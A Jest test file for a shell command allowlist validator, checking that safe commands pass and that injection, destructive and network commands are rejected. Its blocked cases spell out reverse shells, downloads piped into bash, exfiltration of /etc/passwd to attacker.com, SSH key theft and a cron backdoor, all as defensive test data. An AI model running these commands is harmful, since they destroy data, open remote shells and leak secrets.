import { validateCommand, getAllowedCommands } from './allowlist';

describe('Command Allowlist Validation', () => {
  describe('Allowed Commands - Should Pass', () => {
    it('should allow exact match commands', () => {
      expect(validateCommand('pwd').valid).toBe(true);
      expect(validateCommand('ls').valid).toBe(true);
    });

    it('should allow prefix commands with arguments', () => {
      expect(validateCommand('cat file.txt').valid).toBe(true);
      expect(validateCommand('tsx script.ts').valid).toBe(true);
      expect(validateCommand('node index.js').valid).toBe(true);
      expect(validateCommand('npm install').valid).toBe(true);
      expect(validateCommand('echo hello world').valid).toBe(true);
      expect(validateCommand('mkdir test-dir').valid).toBe(true);
      expect(validateCommand('test -f file.txt').valid).toBe(true);
    });

    it('should allow prefix commands without arguments', () => {
      expect(validateCommand('cat').valid).toBe(true);
      expect(validateCommand('echo').valid).toBe(true);
      expect(validateCommand('node').valid).toBe(true);
    });

    it('should handle extra whitespace gracefully', () => {
      expect(validateCommand('  cat file.txt  ').valid).toBe(true);
      expect(validateCommand('tsx  script.ts').valid).toBe(true);
    });

    it('should allow commands with tab separators', () => {
      expect(validateCommand('cat\tfile.txt').valid).toBe(true);
      expect(validateCommand('tsx\tscript.ts').valid).toBe(true);
    });
  });

  describe('Blocked Commands - Should Fail', () => {
    it('should block destructive commands', () => {
      const result = validateCommand('rm -rf /');
      expect(result.valid).toBe(false);
      expect(result.reason).toMatch(/rm/);
    });

    it('should block privilege escalation', () => {
      const sudo = validateCommand('sudo rm file.txt');
      expect(sudo.valid).toBe(false);
      // Note: May match 'sudo' or 'rm ' depending on order in BLOCKED_PATTERNS
      expect(sudo.reason).toMatch(/(sudo|rm)/);
    });

    it('should block process management commands', () => {
      expect(validateCommand('kill 1234').valid).toBe(false);
      expect(validateCommand('shutdown now').valid).toBe(false);
      expect(validateCommand('reboot').valid).toBe(false);
    });

    it('should block permission changes', () => {
      expect(validateCommand('chown root file.txt').valid).toBe(false);
      expect(validateCommand('chmod 777 file.txt').valid).toBe(false);
    });

    it('should block network commands', () => {
      expect(validateCommand('wget http://evil.com/malware').valid).toBe(false);
      expect(validateCommand('curl http://evil.com/script.sh').valid).toBe(false);
      expect(validateCommand('nc -l 4444').valid).toBe(false);
    });
  });

  describe('Shell Operator Injection - Should Fail', () => {
    it('should block output redirection', () => {
      const redirectOut = validateCommand('echo malicious > /etc/passwd');
      expect(redirectOut.valid).toBe(false);
      expect(redirectOut.reason).toMatch(/>/); // Matches both > and >>

      const appendOut = validateCommand('cat file.txt >> output.txt');
      expect(appendOut.valid).toBe(false);
      expect(appendOut.reason).toMatch(/>/); // >> contains >, so matches > first
    });

    it('should block command piping', () => {
      const result = validateCommand('cat /etc/passwd | grep root');
      expect(result.valid).toBe(false);
      expect(result.reason).toMatch(/\|/);
    });

    it('should block command chaining with semicolon', () => {
      const result = validateCommand('ls; rm -rf /');
      expect(result.valid).toBe(false);
      // Note: May match ';' or 'rm ' depending on order in BLOCKED_PATTERNS
      expect(result.reason).toMatch(/(;|rm)/);
    });

    it('should block background execution with ampersand', () => {
      const result = validateCommand('sleep 100 &');
      expect(result.valid).toBe(false);
      expect(result.reason).toMatch(/&/);
    });

    it('should block command substitution with backticks', () => {
      const result = validateCommand('echo `whoami`');
      expect(result.valid).toBe(false);
      expect(result.reason).toMatch(/`/);
    });

    it('should block command substitution with $()', () => {
      const result = validateCommand('echo $(rm -rf /)');
      expect(result.valid).toBe(false);
      // Note: May match '$(' or 'rm ' depending on order in BLOCKED_PATTERNS
      expect(result.reason).toMatch(/(\$\(|rm)/);
    });
  });

  describe('Injection Attempts - Should Fail', () => {
    it('should block injection after allowed command', () => {
      expect(validateCommand('cat file.txt; rm -rf /').valid).toBe(false);
      expect(validateCommand('echo test > /etc/passwd').valid).toBe(false);
      expect(validateCommand('ls | bash').valid).toBe(false);
    });

    it('should block injection before allowed command', () => {
      expect(validateCommand('rm -rf /; cat file.txt').valid).toBe(false);
      expect(validateCommand('wget malware.sh | bash').valid).toBe(false);
    });

    it('should block injection in command arguments', () => {
      expect(validateCommand('cat file.txt | nc attacker.com 4444').valid).toBe(false);
      expect(validateCommand('echo $(curl evil.com/payload)').valid).toBe(false);
    });

    it('should block attempts to use rm after allowed commands', () => {
      expect(validateCommand('ls && rm file.txt').valid).toBe(false);
      expect(validateCommand('pwd; rm -rf *').valid).toBe(false);
    });

    it('should block attempts to execute downloaded scripts', () => {
      expect(validateCommand('cat script.sh | bash').valid).toBe(false);
      expect(validateCommand('node -e `curl evil.com`').valid).toBe(false);
    });
  });

  describe('Edge Cases', () => {
    it('should reject empty commands', () => {
      const result = validateCommand('');
      expect(result.valid).toBe(false);
      expect(result.reason).toMatch(/empty/i);
    });

    it('should reject whitespace-only commands', () => {
      const result = validateCommand('   ');
      expect(result.valid).toBe(false);
      expect(result.reason).toMatch(/empty/i);
    });

    it('should reject commands not in allowlist', () => {
      const result = validateCommand('python script.py');
      expect(result.valid).toBe(false);
      expect(result.reason).toMatch(/not in allowlist/i);
    });

    it('should reject commands that look similar to allowed ones', () => {
      expect(validateCommand('cats file.txt').valid).toBe(false);
      expect(validateCommand('echos hello').valid).toBe(false);
    });

    it('should handle rm with tab separator', () => {
      const result = validateCommand('rm\tfile.txt');
      expect(result.valid).toBe(false);
      expect(result.reason).toMatch(/rm/);
    });
  });

  describe('Real-World Attack Scenarios', () => {
    it('should block reverse shell attempts', () => {
      expect(
        validateCommand('nc -e /bin/bash attacker.com 4444').valid
      ).toBe(false);
      expect(
        validateCommand('bash -i >& /dev/tcp/10.0.0.1/8080 0>&1').valid
      ).toBe(false);
    });

    it('should block data exfiltration attempts', () => {
      expect(
        validateCommand('cat /etc/passwd | curl -X POST attacker.com').valid
      ).toBe(false);
      expect(
        validateCommand('cat secrets.txt > /tmp/exfil.txt').valid
      ).toBe(false);
    });

    it('should block privilege escalation chains', () => {
      expect(
        validateCommand('echo "evil" | sudo tee /etc/passwd').valid
      ).toBe(false);
      expect(
        validateCommand('cat /root/.ssh/id_rsa > mykey').valid
      ).toBe(false);
    });

    it('should block malicious file writes', () => {
      expect(
        validateCommand('echo "* * * * * /bin/bash" > /etc/cron.d/backdoor').valid
      ).toBe(false);
      expect(
        validateCommand('cat payload.sh >> ~/.bashrc').valid
      ).toBe(false);
    });

    it('should block system modification attempts', () => {
      expect(validateCommand('rm -rf ~/.ssh').valid).toBe(false);
      expect(validateCommand('chown nobody /etc/shadow').valid).toBe(false);
      expect(validateCommand('kill -9 1').valid).toBe(false);
    });
  });

  describe('getAllowedCommands()', () => {
    it('should return list of allowed commands', () => {
      const commands = getAllowedCommands();
      expect(Array.isArray(commands)).toBe(true);
      expect(commands.length).toBeGreaterThan(0);
      expect(commands).toContain('cat');
      expect(commands).toContain('tsx');
      expect(commands).toContain('pwd');
    });

    it('should not include blocked commands', () => {
      const commands = getAllowedCommands();
      expect(commands).not.toContain('rm');
      expect(commands).not.toContain('sudo');
      expect(commands).not.toContain('kill');
    });
  });
});
